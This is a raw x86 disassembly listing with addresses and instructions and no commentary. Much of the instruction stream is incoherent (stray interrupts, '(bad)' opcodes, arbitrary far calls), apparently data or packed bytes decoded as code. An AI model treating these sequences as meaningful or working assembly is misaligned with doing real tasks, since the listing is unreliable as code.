  4247ae:	int    0x8d
  4247b0:	lods   eax,DWORD PTR ds:[esi]
  4247b1:	add    al,0x2
  4247b3:	jmp    FWORD PTR [edx+0x76cd4aec]
  4247b9:	std    
  4247ba:	cmp    edx,ebx
  4247bc:	int    0x8d
  4247be:	std    
  4247bf:	cmp    ecx,DWORD PTR [edi]
  4247c1:	shl    edx,cl
  4247c3:	sub    bl,dl
  4247c5:	mov    ebp,0xa8d35392
  4247ca:	retf   
  4247cb:	ror    BYTE PTR [eax-0x12326980],cl
  4247d1:	adc    ch,ch
  4247d3:	xchg   ebp,eax
  4247d4:	add    BYTE PTR [eax-0x2893680],0x49
  4247db:	and    DWORD PTR [esi-0x68936cb],eax
  4247e1:	inc    ecx
  4247e2:	and    DWORD PTR [esi-0x28932cb],eax
  4247e8:	int    0x8d
  4247ea:	std    
  4247eb:	cwde   
  4247ec:	call   0x8621:0xd169ffc0
  4247f3:	xor    eax,0xbdd3793b
  4247f8:	xchg   edx,eax
  4247f9:	mov    al,ds:0xf2d3133b
  4247fe:	sub    BYTE PTR [ebx-0x2d],dl
  424801:	or     dh,BYTE PTR [esi-0x53]
  424804:	int    0x76
  424806:	std    
  424807:	int    0x8d
  424809:	std    
  42480a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42480d:	mov    ebp,0xd3133b92
  424812:	repnz sub BYTE PTR [ebx-0x2d],dl
  424816:	or     dh,BYTE PTR [esi-0xf]
  424819:	int    0xe6
  42481b:	and    al,0xcd
  42481d:	jbe    0x42480c
  42481f:	int    0x8d
  424821:	in     eax,dx
  424822:	cmp    edx,ebx
  424824:	or     dh,BYTE PTR [esi-0x13]
  424827:	adc    dh,BYTE PTR [esi-0x13]
  42482a:	dec    ecx
  42482b:	mov    al,ds:0x76cd3586
  424830:	cmc    
  424831:	int    0x8d
  424833:	cmc    
  424834:	cmp    edx,ebx
  424836:	or     dh,BYTE PTR [esi-0xb]
  424839:	adc    dh,BYTE PTR [esi-0xb]
  42483c:	dec    ecx
  42483d:	lahf   
  42483e:	xchg   BYTE PTR ds:0xcd1176cd,dh
  424844:	lea    edx,[ecx]
  424846:	cmp    edx,ebx
  424848:	or     dh,BYTE PTR [esi+0x11]
  42484b:	adc    dh,BYTE PTR [esi+0x11]
  42484e:	imul   esp,DWORD PTR [ecx],0x76cd3586
  424854:	mov    ch,0xcd
  424856:	lea    esi,[ebp+0x760ad33b]
  42485c:	mov    ch,0x12
  42485e:	jbe    0x424815
  424860:	dec    ecx
  424861:	and    DWORD PTR [ebp+esi*1+0x212476c9],eax
  424868:	hlt    
  424869:	mov    esi,DWORD PTR ds:0x68876cd
  42486f:	ins    DWORD PTR es:[edi],dx
  424870:	das    
  424871:	add    eax,0x80808551
  424876:	int    0x76
  424878:	dec    esp
  424879:	push   es
  42487a:	ins    DWORD PTR es:[edi],dx
  42487b:	das    
  42487c:	add    eax,0x80808538
  424881:	int    0x76
  424883:	sbb    al,0x6
  424885:	ins    DWORD PTR es:[edi],dx
  424886:	das    
  424887:	add    eax,0x80808523
  42488c:	int    0x76
  42488e:	and    al,0xcd
  424890:	jbe    0x4248b6
  424892:	int    0x8d
  424894:	mov    bl,dl
  424896:	mov    ebp,0x39af5692
  42489b:	add    BYTE PTR [eax+0x2f815eb8],0x6
  4248a2:	add    DWORD PTR [ebp+0x76cd8080],0xfd8dcdfd
  4248ac:	cmp    edi,DWORD PTR [ecx-0x2d]
  4248af:	mov    ebp,0xd3133b92
  4248b4:	repnz sub BYTE PTR [ebx-0x2d],dl
  4248b8:	or     dh,BYTE PTR [esi-0xf]
  4248bb:	int    0x76
  4248bd:	std    
  4248be:	int    0x76
  4248c0:	std    
  4248c1:	int    0x76
  4248c3:	mov    ch,cl
  4248c5:	lea    ecx,[eax-0x329b8379]
  4248cb:	outs   dx,BYTE PTR ds:[esi]
  4248cc:	jo     0x4248d8
  4248ce:	lea    esp,[esi+eax*1]
  4248d1:	ins    DWORD PTR es:[edi],dx
  4248d2:	das    
  4248d3:	add    eax,0x808084f0
  4248d8:	leave  
  4248d9:	jbe    0x424870
  4248db:	dec    ecx
  4248dc:	and    DWORD PTR [eax+0x35],edi
  4248df:	int    0x76
  4248e1:	xchg   ebp,eax
  4248e2:	pop    ebx
  4248e3:	int    0xa6
  4248e5:	xchg   ebp,eax
  4248e6:	cmp    edi,DWORD PTR [ecx+0x3b]
  4248e9:	loop   0x4248be
  4248eb:	mov    ebp,0x28e5d392
  4248f0:	push   ebx
  4248f1:	popf   
  4248f2:	or     ah,BYTE PTR [esi-0x289326b]
  4248f8:	int    0x76
  4248fa:	std    
  4248fb:	int    0x8
  4248fd:	sub    eax,0xcd808081
  424902:	xor    ch,cl
  424904:	bound  esp,QWORD PTR [edi+eax*4+0x30]
  424908:	int    0x76
  42490a:	std    
  42490b:	int    0x76
  42490d:	std    
  42490e:	int    0x8
  424910:	and    eax,0xcd808081
  424915:	sbb    al,0xa
  424917:	xchg   esi,eax
  424918:	dec    esp
  424919:	inc    ebx
  42491a:	fst    st(6)
  42491c:	push   0xffffffcd
  42491e:	(bad)  
  42491f:	cmc    
  424920:	int    0x8
  424922:	adc    DWORD PTR [ecx-0x69307f80],eax
  424928:	lods   eax,DWORD PTR ds:[esi]
  424929:	(bad)  
  42492a:	int    0x96
  42492c:	cmc    
  42492d:	cmp    ecx,DWORD PTR [edi]
  42492f:	add    al,0xfb
  424931:	call   ebx
  424933:	jmp    0x4248c7
  424935:	shr    edx,cl
  424937:	sub    BYTE PTR [ebx-0x1d],dl
  42493a:	int    0x8d
  42493c:	dec    esp
  42493d:	bound  eax,QWORD PTR [eax]
  42493f:	xchg   ecx,eax
  424940:	jo     0x42499d
  424942:	add    BYTE PTR [eax+0x24],dh
  424945:	int    0x8d
  424947:	dec    esp
  424948:	int    0x6e
  42494a:	xchg   esp,eax
  42494b:	int    0x7e
  42494d:	jo     0x424982
  42494f:	jge    0x4249c2
  424951:	xchg   ebp,eax
  424953:	jo     0x424912
  424955:	dec    esi
  424956:	xchg   BYTE PTR [eax+0x248dcd80],al
  42495c:	int    0x8
  42495e:	xor    eax,0xa808081
  424963:	sbb    al,0x0
  424965:	xchg   ecx,eax
  424966:	xchg   esp,eax
  424967:	add    dh,dl
  424969:	mov    BYTE PTR [ebx-0x43],bl
  42496c:	or     eax,0xcd808084
  424971:	pop    ebx
  424972:	fs xchg ebp,edx
  424975:	das    
  424976:	mov    ebx,0x74cf1452
  42497b:	xor    BYTE PTR [edx+ecx*1],bl
  42497e:	jbe    0x42499c
  424980:	int    0x76
  424982:	std    
  424983:	int    0x8d
  424985:	std    
  424986:	cmp    edi,DWORD PTR [ecx+0x4]
  424989:	add    bh,bh
  42498b:	shl    edx,cl
  42498d:	sub    bl,dl
  42498f:	mov    ebp,0x2fd35392
  424994:	mov    ebx,0x960a868a
  424999:	and    al,0x43
  42499b:	jge    0x4249cc
  42499d:	add    eax,0x808080e9
  4249a2:	int    0x76
  4249a4:	std    
  4249a5:	int    0x8d
  4249a7:	std    
  4249a8:	cmp    edi,DWORD PTR [ecx+0x4]
  4249ab:	add    bh,bh
  4249ad:	shl    edx,cl
  4249af:	sub    bl,dl
  4249b1:	mov    ebp,0xad35392
  4249b6:	jbe    0x42495d
  4249b8:	int    0x76
  4249ba:	stc    
  4249bb:	int    0x8d
  4249bd:	stc    
  4249be:	add    al,0x2
  4249c0:	(bad)  
  4249c1:	cmp    edi,DWORD PTR [ecx-0x2d]
  4249c4:	repnz sub bl,dl
  4249c7:	mov    ebp,0x2fd35392
  4249cc:	mov    ebx,0x7d33868a
  4249d1:	pop    esi
  4249d2:	lea    esp,[ebp-0x7f2ef7d1]
  4249d8:	add    BYTE PTR [eax+0x41c8dcd],0xd3
  4249df:	mov    BYTE PTR [edx],cl
  4249e1:	lea    ebx,[esp+ebp*8]
  4249e4:	xchg   ebp,ecx
  4249e6:	lea    ebx,[ecx*8+0x31cd5c52]
  4249ed:	or     dh,BYTE PTR [esi-0x63]
  4249f0:	jl     0x4249f8
  4249f2:	icebp  
  4249f3:	aam    0x89
  4249f5:	clc    
  4249f6:	icebp  
  4249f7:	sub    edx,edx
  4249f9:	xchg   DWORD PTR [esi-0x63],esi
  4249fc:	in     al,dx
  4249fd:	xchg   edx,eax
  4249fe:	int    0xd2
  424a00:	jo     0x4249cf
  424a02:	outs   dx,BYTE PTR ds:[esi]
  424a03:	test   BYTE PTR [edi+0x63bd70c5],al
  424a09:	test   DWORD PTR [eax+0x1c76cd80],eax
  424a0f:	int    0x7c
  424a11:	mov    BYTE PTR [edx],cl
  424a13:	lea    ebx,[ebp-0x32027233]
  424a19:	xchg   esi,eax
  424a1a:	std    
  424a1b:	cmp    ecx,DWORD PTR [edi]
  424a1d:	add    al,0xfb
  424a1f:	call   ebx
  424a21:	jmp    0x4249b5
  424a23:	shr    edx,cl
  424a25:	sub    BYTE PTR [ebx+0x13],dl
  424a28:	pop    esi
  424a29:	lea    ebx,[ebp-0x7232e32c]
  424a2f:	mov    BYTE PTR [edi-0x29ffb384],al
  424a35:	popf   
  424a36:	int    0x6c
  424a38:	test   BYTE PTR [ecx-0x79],dh
  424a3b:	lds    esi,FWORD PTR [eax-0x43]
  424a3e:	add    eax,DWORD PTR [edi+0x76cd8080]
  424a44:	sbb    al,0xcd
  424a46:	(bad)  
  424a47:	stc    
  424a48:	int    0x96
  424a4a:	stc    
  424a4b:	cmp    ecx,DWORD PTR [edi]
  424a4d:	shr    ebx,cl
  424a4f:	xchg   edx,eax
  424a50:	add    al,0xfb
  424a52:	inc    DWORD PTR [ebp*2+0x28ead33c]
  424a59:	push   ebx
  424a5a:	adc    eax,DWORD PTR [ecx-0x69325a73]
  424a60:	and    al,0xa
  424a62:	jbe    0x424a80
  424a64:	int    0x76
  424a66:	stc    
  424a67:	int    0x8d
  424a69:	stc    
  424a6a:	add    al,0x2
  424a6c:	(bad)  
  424a6d:	cmp    edi,DWORD PTR [ecx-0x2d]
  424a70:	repnz sub bl,dl
  424a73:	mov    ebp,0xcdd35392
  424a78:	lea    esp,[edi+ebp*1]
  424a7b:	mov    ebx,0x7d33867e
  424a80:	pop    esi
  424a81:	lea    esp,[ebp+0xa4072f]
  424a87:	add    BYTE PTR [eax],al
  424a89:	int    0x8
  424a8b:	and    eax,0x43808081
  424a90:	sbb    al,0xd6
  424a92:	cmp    ecx,ebp
  424a94:	lea    edx,[ecx]
  424a96:	int    0x8
  424a98:	adc    DWORD PTR [ecx-0x69307f80],eax
  424a9e:	lods   eax,DWORD PTR ds:[esi]
  424a9f:	(bad)  
  424aa0:	int    0x96
  424aa2:	adc    DWORD PTR [ebx],edi
  424aa4:	(bad)  
  424aa6:	sti    
  424aa7:	call   ebx
  424aa9:	jmp    0x424a3d
  424aab:	shr    edx,cl
  424aad:	sub    BYTE PTR [ebx-0x1d],dl
  424ab0:	int    0x8d
  424ab2:	dec    esp
  424ab3:	bound  eax,QWORD PTR [eax]
  424ab5:	xchg   ecx,eax
  424ab6:	xchg   esp,eax
  424ab7:	pop    ebx
  424ab8:	add    BYTE PTR [eax+0x24],dh
  424abb:	push   es
  424abc:	ins    DWORD PTR es:[edi],dx
  424abd:	das    
  424abe:	add    eax,0x808092d9
  424ac3:	int    0x96
  424ac5:	and    al,0xcd
  424ac7:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424acd:	or     ch,0x7d
  424ad0:	cmp    ecx,DWORD PTR [edi]
  424ad2:	add    al,0x11
  424ad4:	call   ebx
  424ad6:	jmp    0x424a6a
  424ad8:	shr    DWORD PTR [ebp+0x2f7d5328],cl
  424ade:	add    eax,0x808081da
  424ae3:	int    0x76
  424ae5:	std    
  424ae6:	int    0x8d
  424ae8:	std    
  424ae9:	cmp    edi,DWORD PTR [ecx+0x4]
  424aec:	add    bh,bh
  424aee:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424af4:	push   ebx
  424af5:	ror    DWORD PTR [edx],cl
  424af7:	jbe    0x424ab6
  424af9:	pop    ebp
  424afa:	push   0xcf35869f
  424aff:	jl     0x424aae
  424b01:	or     cl,BYTE PTR [ebp+0x658d0a5d]
  424b07:	leave  
  424b08:	jbe    0x424b4f
  424b0a:	sbb    BYTE PTR [edi+0x76c93586],bl
  424b10:	shr    al,1
  424b12:	lahf   
  424b13:	xchg   BYTE PTR ds:0xc955760a,dh
  424b19:	jbe    0x424b88
  424b1b:	dec    ecx
  424b1c:	and    DWORD PTR [esi-0x3234c4cb],eax
  424b22:	xchg   esp,eax
  424b23:	iret   
  424b24:	inc    ebp
  424b25:	shl    ebx,cl
  424b27:	xchg   edx,eax
  424b28:	adc    bh,bl
  424b2a:	scas   eax,DWORD PTR es:[edi]
  424b2b:	cmp    DWORD PTR [eax+0x150ab880],eax
  424b31:	lea    esi,[eax+eax*1+0x0]
  424b35:	add    BYTE PTR [esi+0x4],ch
  424b38:	cli    
  424b39:	xchg   BYTE PTR [edx-0x6047a019],al
  424b3f:	xchg   BYTE PTR ds:0x94060a,dh
  424b45:	add    BYTE PTR [eax],al
  424b47:	or     al,BYTE PTR [esi]
  424b49:	mov    esp,0xa000000
  424b4e:	jbe    0x424b00
  424b50:	or     dh,BYTE PTR [esi+0x15]
  424b53:	iret   
  424b54:	outs   dx,BYTE PTR ds:[esi]
  424b55:	std    
  424b56:	iret   
  424b57:	jno    0x424bc9
  424b59:	or     dh,BYTE PTR [esi+0x2d]
  424b5c:	or     dh,BYTE PTR [esi+0x35]
  424b5f:	leave  
  424b60:	push   es
  424b61:	jo     0x424b63
  424b63:	add    BYTE PTR [eax],al
  424b65:	sub    DWORD PTR [edi-0x30f5ca7a],ebx
  424b6b:	pushf  
  424b6c:	add    BYTE PTR [eax],al
  424b6e:	add    BYTE PTR [edx],cl
  424b70:	pop    ss
  424b71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b72:	add    BYTE PTR [eax],al
  424b74:	add    cl,cl
  424b76:	push   es
  424b77:	lods   al,BYTE PTR ds:[esi]
  424b78:	add    BYTE PTR [eax],al
  424b7a:	add    BYTE PTR [edx-0x61],cl
  424b7d:	xchg   BYTE PTR ds:0xb406c9,dh
  424b83:	add    BYTE PTR [eax],al
  424b85:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b8b:	les    eax,FWORD PTR [eax]
  424b8d:	add    BYTE PTR [eax],al
  424b8f:	popa   
  424b90:	lahf   
  424b91:	xchg   BYTE PTR ds:0x9006c9,dh
  424b97:	add    BYTE PTR [eax],al
  424b99:	sbb    BYTE PTR [edi+0x6c93586],bl
  424b9f:	aam    0x0
  424ba1:	add    BYTE PTR [eax],al
  424ba3:	call   0xa77d247
  424ba8:	iret   
  424ba9:	fadd   QWORD PTR [eax]
  424bab:	add    BYTE PTR [eax],al
  424bad:	leave  
  424bae:	push   es
  424baf:	in     al,0x0
  424bb1:	add    BYTE PTR [eax],al
  424bb3:	mov    bl,BYTE PTR [edi-0x69f5ca7a]
  424bb9:	add    ecx,ecx
  424bbb:	jbe    0x424bc2
  424bbd:	and    bl,BYTE PTR [edi-0x72f5ca7a]
  424bc3:	or     ecx,ecx
  424bc5:	jbe    0x424b93
  424bc7:	inc    ecx
  424bc8:	lahf   
  424bc9:	xchg   BYTE PTR ds:0xc91d8d0a,dh
  424bcf:	jbe    0x424bf6
  424bd1:	pusha  
  424bd2:	lahf   
  424bd3:	xchg   BYTE PTR ds:0x493d76c9,dh
  424bd9:	and    DWORD PTR [esi-0x3292c4cb],eax
  424bdf:	int3   
  424be0:	push   es
  424be1:	jo     0x424be3
  424be3:	add    BYTE PTR [eax],al
  424be5:	shr    ebx,cl
  424be7:	xchg   edx,eax
  424be8:	add    DWORD PTR [edx],eax
  424bea:	scas   eax,DWORD PTR es:[edi]
  424beb:	or     esp,ecx
  424bed:	test   DWORD PTR [eax+eax*1+0x0],eax
  424bf1:	add    BYTE PTR [esp+eax*1-0x7],ch
  424bf5:	sbb    al,BYTE PTR [edx+0x1108cdb9]
  424bfb:	add    DWORD PTR [eax+0x74cfcf80],0x71000000
  424c05:	add    BYTE PTR [eax-0x7c],dh
  424c08:	int    0xb3
  424c0a:	adc    DWORD PTR [ecx+0x17cf8080],eax
  424c10:	inc    esp
  424c11:	add    BYTE PTR [eax],al
  424c13:	add    BYTE PTR [edx+0x70],ah
  424c16:	add    BYTE PTR [ecx-0x78],dh
  424c19:	or     dh,BYTE PTR [esi+0x7d]
  424c1c:	iret   
  424c1d:	jbe    0x424bdc
  424c1f:	jo     0x424bee
  424c21:	or     BYTE PTR ds:0x808081,ah
  424c27:	push   eax
  424c28:	int    0x76
  424c2a:	jge    0x424c2c
  424c2c:	icebp  
  424c2d:	int    0x76
  424c2f:	std    
  424c30:	int    0x8d
  424c32:	std    
  424c33:	cmp    edi,DWORD PTR [ecx+0x4]
  424c36:	add    bh,bh
  424c38:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424c3e:	push   ebx
  424c3f:	ror    DWORD PTR [edx],cl
  424c41:	jbe    0x424c50
  424c43:	int    0x8d
  424c45:	std    
  424c46:	int    0x76
  424c48:	std    
  424c49:	cmp    ecx,DWORD PTR [edi]
  424c4b:	add    al,0x11
  424c4d:	call   ebx
  424c4f:	lods   eax,DWORD PTR ds:[esi]
  424c50:	sub    bl,dl
  424c52:	jmp    0x424be6
  424c54:	push   ebx
  424c55:	jge    0x424c24
  424c57:	jbe    0x424c16
  424c59:	inc    ebx
  424c5a:	rcl    esp,cl
  424c5c:	xchg   esi,eax
  424c5d:	or     dh,BYTE PTR [esi+0x75]
  424c60:	in     al,dx
  424c61:	das    
  424c62:	int    0x80
  424c64:	int    0x8d
  424c66:	jne    0x424c72
  424c68:	jbe    0x424c27
  424c6a:	int    0x76
  424c6c:	mov    ebp,0x4dd4d343
  424c71:	int    0x70
  424c73:	sbb    al,0xcd
  424c75:	mov    bl,0x25
  424c77:	add    DWORD PTR [eax-0x29cebc80],0x25b3cdb5
  424c81:	add    DWORD PTR [eax+0x1c70cd80],0x3ad63143
  424c8b:	int    0xb3
  424c8d:	sub    eax,0xcd808081
  424c92:	xchg   esi,eax
  424c93:	dec    esp
  424c94:	int    0x62
  424c96:	cmp    al,0x87
  424c98:	xor    DWORD PTR [edx],ecx
  424c9a:	jo     0x424cc0
  424c9c:	int    0x76
  424c9e:	stc    
  424c9f:	int    0x8d
  424ca1:	stc    
  424ca2:	cmp    edi,DWORD PTR [ecx+0x4]
  424ca5:	add    bh,bh
  424ca7:	sar    DWORD PTR [ebp+0x28f2d392],cl
  424cad:	push   ebx
  424cae:	ror    DWORD PTR [edx],cl
  424cb0:	jbe    0x424cbf
  424cb2:	int    0x96
  424cb4:	and    al,0x9a
  424cb6:	pop    ebx
  424cb7:	mov    ebp,0xf5e2
  424cbc:	push   es
  424cbd:	ins    DWORD PTR es:[edi],dx
  424cbe:	das    
  424cbf:	add    eax,0x80808099
  424cc4:	add    dh,dl
  424cc6:	and    al,0xcd
  424cc8:	lock pop ebx
  424cca:	mov    ebp,0xf52c
  424ccf:	push   es
  424cd0:	ins    DWORD PTR es:[edi],dx
  424cd1:	das    
  424cd2:	add    eax,0x808080c5
  424cd7:	int    0x76
  424cd9:	and    al,0xcd
  424cdb:	lock int 0xd5
  424cde:	mov    ebp,0xfbe7
  424ce3:	push   es
  424ce4:	ins    DWORD PTR es:[edi],dx
  424ce5:	das    
  424ce6:	add    eax,0x808080d1
  424ceb:	call   0x0:0xf90ebd5b
  424cf2:	push   es
  424cf3:	ins    DWORD PTR es:[edi],dx
  424cf4:	das    
  424cf5:	add    eax,0x8080802d
  424cfa:	int    0x8
  424cfc:	and    eax,0x43808081
  424d01:	sbb    al,0xd6
  424d03:	sbb    cl,ch
  424d05:	or     BYTE PTR [ecx],dl
  424d07:	add    DWORD PTR [eax-0x52723080],0xadd60071
  424d11:	int    0x8d
  424d13:	dec    esp
  424d14:	add    BYTE PTR [ecx+0x70005b94],dl
  424d1a:	and    al,0xcd
  424d1c:	or     BYTE PTR [ebp-0x327f7f7f],bl
  424d22:	or     ch,0x7d
  424d25:	cmp    ecx,DWORD PTR [edi]
  424d27:	add    al,0x11
  424d29:	call   ebx
  424d2b:	jmp    0x424cbf
  424d2d:	shr    DWORD PTR [ebp-0x2b82acd8],cl
  424d33:	(bad)
  424d37:	dec    ecx
  424d38:	and    BYTE PTR [esi-0x778932cb],al
  424d3e:	int    0x8d
  424d40:	mov    ch,cl
  424d42:	jbe    0x424d68
  424d44:	shr    ebx,cl
  424d46:	xchg   edx,eax
  424d47:	adc    al,BYTE PTR [edx]
  424d49:	scas   eax,DWORD PTR es:[edi]
  424d4a:	cmp    DWORD PTR [eax+0x7c89b880],eax
  424d50:	sbb    ch,cl
  424d52:	ins    BYTE PTR es:[edi],dx
  424d53:	cmp    al,0xcd
  424d55:	lea    ebp,[edi+eax*4]
  424d58:	lds    ecx,FWORD PTR [edx]
  424d5a:	outs   dx,BYTE PTR ds:[esi]
  424d5b:	adc    al,0xcd
  424d5d:	jbe    0x424d8b
  424d5f:	leave  
  424d60:	add    BYTE PTR [edi-0x327f7f80],0x76
  424d67:	sub    al,0xa
  424d69:	pushf  
  424d6a:	test   ch,cl
  424d6c:	jbe    0x424d9e
  424d6e:	int    0x8d
  424d70:	sub    al,0xa
  424d72:	outs   dx,BYTE PTR ds:[esi]
  424d73:	mov    ch,cl
  424d75:	jbe    0x424d8b
  424d77:	int    0x8d
  424d79:	sub    al,0xa
  424d7b:	outs   dx,BYTE PTR ds:[esi]
  424d7c:	dec    esp
  424d7d:	in     al,dx
  424d7e:	adc    al,0xcd
  424d80:	jbe    0x424da6
  424d82:	int    0x6c
  424d84:	cmp    al,0xcd
  424d86:	lea    ebp,[edi+eax*4]
  424d89:	lds    ecx,FWORD PTR [edx]
  424d8b:	outs   dx,BYTE PTR ds:[esi]
  424d8c:	adc    al,0xcd
  424d8e:	jbe    0x424dbc
  424d90:	add    al,0x2c
  424d92:	or     cl,0x76
  424d95:	icebp  
  424d96:	add    DWORD PTR [eax-0x19fb7f80],0x92d680f1
  424da0:	cmp    ebx,ebp
  424da2:	int    0xc5
  424da4:	arpl   sp,bp
  424da6:	xchg   edx,eax
  424da7:	cmp    ebp,DWORD PTR [ebp-0x56]
  424daa:	test   al,0xcb
  424dac:	shl    BYTE PTR [eax+eax*4],cl
  424daf:	xchg   esi,eax
  424db0:	int    0xed
  424db2:	jno    0x424e25
  424db4:	das    
  424db5:	mov    ebx,0x74cf146e
  424dba:	mov    BYTE PTR [edi+ebp*1],bl
  424dbd:	mov    ebx,0x9a5b867e
  424dc2:	leave  
  424dc3:	jbe    0x424dc2
  424dc5:	dec    ecx
  424dc6:	and    DWORD PTR [esi-0x672f5cb],eax
  424dcc:	push   es
  424dcd:	retf   
  424dce:	aam    0xb4
  424dd0:	popa   
  424dd1:	shl    DWORD PTR [ecx],1
  424dd3:	xchg   BYTE PTR ds:0xcd4c7ccd,dh
  424dd9:	out    0x88,al
  424ddb:	xchg   edx,edi
  424ddd:	pop    esi
  424dde:	out    0x4c,al
  424de0:	or     BYTE PTR [ebp-0x33],0xdc
  424de4:	mov    BYTE PTR [edi-0x77197806],al
  424dea:	pop    esi
  424deb:	out    0x4c,al
  424ded:	cmp    BYTE PTR [edx-0x33],0x8d
  424df1:	std    
  424df2:	int    0xe6
  424df4:	std    
  424df5:	cmp    edx,DWORD PTR [ebx]
  424df7:	add    al,0xf8
  424df9:	call   ebx
  424dfb:	jmp    0xd41e1b28
  424e00:	in     al,dx
  424e01:	xchg   edx,eax
  424e02:	push   ebx
  424e03:	cld    
  424e04:	add    al,0xf2
  424e06:	std    
  424e07:	add    al,0xd3
  424e09:	test   BYTE PTR [ebp*2+0x10d37a3c],al
  424e10:	sub    BYTE PTR [ebx-0x6],dl
  424e13:	adc    bh,al
  424e15:	dec    ecx
  424e16:	and    DWORD PTR [esi-0x2197ecb],eax
  424e1c:	int    0x8d
  424e1e:	std    
  424e1f:	int    0xe6
  424e21:	std    
  424e22:	cmp    edx,DWORD PTR [ebx]
  424e24:	add    al,0xf8
  424e26:	call   ebx
  424e28:	jmp    0x424dbc
  424e2a:	shr    ecx,cl
  424e2c:	sub    BYTE PTR [ebx-0x10],dl
  424e2f:	inc    ebx
  424e30:	(bad)  
  424e31:	stc    
  424e32:	xor    BYTE PTR [ecx+0x63aa6d3b],0xcb
  424e39:	ror    BYTE PTR [eax-0x12326980],cl
  424e3f:	add    al,0xed
  424e41:	push   eax
  424e42:	leave  
  424e43:	jbe    0x424dea
  424e45:	mov    edx,0xc98080ac
  424e4a:	jbe    0x424e01
  424e4c:	xchg   eax,ecx
  424e4e:	add    BYTE PTR [eax-0x68528937],0x40
  424e55:	add    BYTE PTR [eax-0x51068937],0x30
  424e5c:	test   BYTE PTR [eax-0x4a028937],al
  424e62:	lods   al,BYTE PTR ds:[esi]
  424e63:	add    BYTE PTR [eax+0x69f176c9],0x53
  424e6a:	add    BYTE PTR [eax-0x76a8937],0x42
  424e71:	add    BYTE PTR [eax-0x78628937],0x80
  424e78:	add    BYTE PTR [eax-0x2c428937],0xb8
  424e7f:	add    BYTE PTR [eax-0x32128937],0x71
  424e86:	add    BYTE PTR [eax-0x1dee8937],0xb6
  424e8d:	add    BYTE PTR [eax+0x5dfd8dcd],0x8b
  424e94:	mov    al,BYTE PTR [eax-0x322ccc80]
  424e9a:	(bad)  
  424e9b:	stc    
  424e9c:	cmp    ebx,edx
  424e9e:	clc    
  424e9f:	add    bl,BYTE PTR [eax+0x127dcd9a]
  424ea5:	repnz popa 
  424ea7:	and    al,BYTE PTR [eax-0x7a34ed80]
  424ead:	mov    BYTE PTR [eax+0x42021280],0xa4
  424eb4:	add    BYTE PTR [eax+0x3cded312],0x80
  424ebb:	or     cl,0x76
  424ebe:	cmc    
  424ebf:	icebp  
  424ec0:	lea    eax,[eax-0x2893680]
  424ec6:	jnp    0x424e9c
  424ec8:	add    BYTE PTR [eax+0x18f976c9],0x30
  424ecf:	add    BYTE PTR [eax-0x32068933],0x96
  424ed6:	std    
  424ed7:	ss dec eax
  424ed9:	pushf  
  424eda:	add    BYTE PTR [eax+0x7687d23b],0xf5
  424ee1:	int    0xe3
  424ee3:	push   esi
  424ee4:	jp     0x424ee5
  424ee6:	add    BYTE PTR [eax-0x69f50ecd],0xfd
  424eed:	int    0x76
  424eef:	std    
  424ef0:	xchg   DWORD PTR [esi-0x78],esi
  424ef3:	int    0x96
  424ef5:	std    
  424ef6:	xchg   DWORD PTR [esi+0x922ca4c],edx
  424efc:	xor    ch,cl
  424efe:	jbe    0x424f11
  424f00:	int    0x96
  424f02:	in     eax,dx
  424f03:	sbb    BYTE PTR ss:[edi-0x80],cl
  424f07:	cmp    BYTE PTR [ebx],0xd2
  424f0a:	int    0x96
  424f0c:	mov    ebp,0xe261d253
  424f11:	fadd   DWORD PTR [eax-0x320ecc80]
  424f17:	jbe    0x424ece
  424f19:	xchg   DWORD PTR [ebx],edx
  424f1b:	popa   
  424f1c:	fist   WORD PTR [eax+eax*4-0x80]
  424f20:	xor    esi,ecx
  424f22:	xchg   DWORD PTR [esi-0x5a893253],edx
  424f28:	int    0xd6
  424f2a:	xor    ch,cl
  424f2c:	out    0x9d,al
  424f2e:	adc    bh,bl
  424f30:	mov    DWORD PTR [ecx-0x80],esi
  424f33:	sub    BYTE PTR [ebx],0xf1
  424f36:	int    0x76
  424f38:	xchg   ebp,eax
  424f39:	adc    bh,bl
  424f3b:	mov    dh,0x2c
  424f3d:	add    BYTE PTR [eax-0x25c404cd],0xf8
  424f44:	clc    
  424f45:	int    0x96
  424f47:	icebp  
  424f48:	push   esi
  424f49:	out    0x1e,al
  424f4b:	add    BYTE PTR [eax-0x1c322dd5],0x33
  424f52:	icebp  
  424f53:	adc    dh,bl
  424f55:	pop    es
  424f56:	push   edx
  424f57:	add    BYTE PTR [eax+0x72f9943],0x63
  424f5e:	add    BYTE PTR [eax],al
  424f60:	add    BYTE PTR [edx+0x4cd2cba8],ch
  424f66:	adc    BYTE PTR [esi-0x12fb1233],0x74
  424f6d:	pop    ebx
  424f6e:	cwde   
  424f6f:	call   0x8043:0xd9ed76c9
  424f76:	or     cl,0x76
  424f79:	adc    DWORD PTR [edx+0x7e],esi
  424f7c:	add    BYTE PTR [eax+0x5ff576c9],0x71
  424f83:	add    BYTE PTR [eax+0xbf976c9],0x71
  424f8a:	add    BYTE PTR [eax+0x29fd76c9],0x2c
  424f91:	add    BYTE PTR [eax-0x275a8937],0x58
  424f98:	add    BYTE PTR [eax+0x76ad76c9],0x84
  424f9f:	add    BYTE PTR [eax+0x6cb576c9],0x8c
  424fa6:	add    BYTE PTR [eax+0x1abd76c9],0x5e
  424fad:	add    BYTE PTR [eax-0x449a8937],0x6f
  424fb4:	add    BYTE PTR [eax+0x4a6d76c9],0x80
  424fbb:	add    BYTE PTR [eax+0x4d7576c9],0x38
  424fc2:	add    BYTE PTR [eax+0x1f7d76c9],0x28
  424fc9:	add    BYTE PTR [eax-0x44f28937],0x4d
  424fd0:	add    BYTE PTR [eax-0x1b0e8937],0x1c
  424fd7:	add    BYTE PTR [eax-0x32528933],0x8d
  424fde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424fdf:	dec    ebp
  424fe0:	bound  ebp,QWORD PTR [ebx]
  424fe2:	add    BYTE PTR [eax-0x7f59c2ba],0x80
  424fe9:	dec    ebp
  424fea:	pop    ds
  424feb:	and    eax,DWORD PTR [eax-0x2c2ed080]
  424ff1:	pop    edi
  424ff2:	xchg   ecx,eax
  424ff3:	mov    bh,0x7e
  424ff5:	stc    
  424ff6:	xor    edi,DWORD PTR [ebp-0x33]
  424ff9:	jbe    0x424ff8
  424ffb:	int    0x96
  424ffd:	stc    
